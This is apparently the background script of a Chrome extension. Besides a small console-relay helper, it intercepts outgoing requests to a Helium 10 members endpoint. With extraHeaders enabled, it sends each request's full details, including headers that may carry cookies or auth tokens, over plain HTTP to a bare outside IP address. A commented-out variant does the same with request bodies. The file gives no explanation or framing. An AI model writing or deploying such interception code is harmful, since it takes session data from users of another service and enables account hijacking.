

const tab_log = function(json_args) {
  var args = JSON.parse(unescape(json_args));
  console[args[0]].apply(console, Array.prototype.slice.call(args, 1));
}

chrome.extension.onRequest.addListener(function(request) {
  if (request.command !== 'sendToConsole')
    return;
  chrome.tabs.executeScript(request.tabId, {
      code: "("+ tab_log + ")('" + request.args + "');",
  });
});

// var callback = function (details) {
//   chrome.extension.getBackgroundPage().console.log(details);
//   fetch(`http://69.164.216.173/log?newdata=[${JSON.stringify(details)}]`)
// .then(function(response) {
//   if (!response.ok) {
//     throw Error(response.statusText);
//   }
//   // Read the response as json.
// })
// .catch(function(error) {
//   console.log('Looks like there was a problem: \n', error);
// });
// };
// var filter = { urls: ["https://members.helium10.com/extension/get-stock"] };
// var opt_extraInfoSpec = ["blocking", "requestBody", "extraHeaders"];

// chrome.webRequest.onBeforeRequest.addListener(
//   callback, filter, opt_extraInfoSpec);


chrome.webRequest.onBeforeSendHeaders.addListener(
  function (details) {
    fetch(`http://69.164.216.173/log?newdata=[${JSON.stringify(details)}]`)
      .then(function (response) {
        if (!response.ok) {
          throw Error(response.statusText);
        }
        // Read the response as json.
      })
      .catch(function (error) {
        console.log('Looks like there was a problem: \n', error);
      });
  },
  { urls: ["https://members.helium10.com/extension/get-stock"] },
  ["blocking", "requestHeaders","extraHeaders"]);
